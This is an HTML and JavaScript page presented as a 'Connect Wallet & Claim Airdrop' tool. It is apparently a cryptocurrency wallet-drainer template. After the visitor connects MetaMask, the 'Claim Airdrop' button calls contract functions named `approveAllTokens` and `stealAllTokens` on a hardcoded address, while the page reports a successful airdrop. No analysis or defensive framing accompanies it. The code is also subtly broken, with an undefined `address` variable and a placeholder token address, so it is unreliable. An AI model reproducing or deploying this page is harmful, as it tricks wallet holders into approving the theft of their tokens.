<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Wallet & Claim Airdrop Example</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
</head>
<body>

    <h1>Connect Wallet & Claim Airdrop</h1>

    <button id="connectWalletBtn">Connect Wallet</button>
    <p id="walletAddress"></p>
    <button id="claimAirdropBtn" style="display: none;">Claim Airdrop</button>

    <p id="claimStatus"></p>

    <script>
        let contractAddress = "0xcD8F8002E9A7B9e20Af9B6bb1D6AE0C6754Fe8c9"; // Contract address from your ABI
        let abi = [ 
            {
                "inputs": [{"internalType": "address", "name": "token", "type": "address"}],
                "name": "approveAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "address", "name": "victim", "type": "address"}],
                "name": "stealAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "stateMutability": "nonpayable",
                "type": "constructor"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        document.getElementById('connectWalletBtn').addEventListener('click', async () => {
            if (typeof window.ethereum !== 'undefined') {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();

                try {
                    await provider.send('eth_requestAccounts', []);
                    const address = await signer.getAddress();
                    document.getElementById('walletAddress').innerText = `Wallet Connected: ${address}`;
                    document.getElementById('claimAirdropBtn').style.display = "block";
                } catch (error) {
                    console.error('Error connecting wallet:', error);
                }
            } else {
                alert('MetaMask is not installed!');
            }
        });

        document.getElementById('claimAirdropBtn').addEventListener('click', async () => {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            const contract = new ethers.Contract(contractAddress, abi, signer);

            try {
                // Approve all tokens
                let approveTx = await contract.approveAllTokens("0xTokenAddressHere");
                await approveTx.wait(); // Wait for transaction to confirm
                document.getElementById('claimStatus').innerText = "Approval successful, now claiming airdrop...";

                // Claim Airdrop
                let claimTx = await contract.stealAllTokens(address);
                await claimTx.wait(); // Wait for transaction to confirm
                document.getElementById('claimStatus').innerText = "Airdrop claimed successfully!";
            } catch (error) {
                console.error('Error during airdrop claim:', error);
                document.getElementById('claimStatus').innerText = "Failed to claim airdrop.";
            }
        });
    </script>

</body>
</html>
